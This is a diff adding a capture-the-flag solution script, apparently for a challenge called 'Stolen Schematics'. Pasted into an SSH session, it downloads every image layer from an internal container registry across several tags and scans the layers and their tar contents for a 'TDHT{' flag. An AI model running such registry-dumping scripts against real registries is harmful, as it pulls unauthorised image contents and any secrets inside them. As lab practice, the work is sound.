@@ -1,0 +1,52 @@
+# STOLEN SCHEMATICS - One-liner Registry Search
+# Copy-paste this entire block into your SSH session
+
+python3 << 'PYEND'
+import urllib.request, json, gzip, io, tarfile
+
+REG = "http://172.27.0.1:5000"
+repo = "images/stolen-schematics-watcher"
+
+def gj(u):
+    r = urllib.request.Request(u)
+    r.add_header("Accept", "application/vnd.oci.image.index.v1+json")
+    return json.load(urllib.request.urlopen(r, timeout=15))
+
+for tag in ["v1", "latest", "team131-fix"]:
+    try:
+        print(f"\n=== Checking tag: {tag} ===")
+        m = gj(f"{REG}/v2/{repo}/manifests/{tag}")
+        for idx, L in enumerate(m.get("layers", [])):
+            digest = L["digest"]
+            size = L["size"]
+            print(f"Layer {idx}: {size} bytes")
+            d = urllib.request.urlopen(f"{REG}/v2/{repo}/blobs/{digest}", timeout=30).read()
+            try:
+                raw = gzip.decompress(d)
+            except:
+                raw = d
+            if b"TDHT{" in raw:
+                print("\n" + "="*50)
+                print("FOUND FLAG!")
+                print("="*50)
+                i = raw.find(b"TDHT{")
+                print(raw[i:i+100].decode('utf-8', 'replace'))
+                exit(0)
+            try:
+                tf = tarfile.open(fileobj=io.BytesIO(raw))
+                for mem in tf.getmembers():
+                    if mem.isfile():
+                        c = tf.extractfile(mem).read()
+                        if b"TDHT{" in c:
+                            print("\n" + "="*50)
+                            print(f"FOUND FLAG in {mem.name}!")
+                            print("="*50)
+                            print(c.decode('utf-8', 'replace')[:500])
+                            exit(0)
+            except:
+                pass
+    except Exception as e:
+        print(f"Tag {tag} error: {e}")
+
+print("\nFlag not in registry - try different approach")
+PYEND
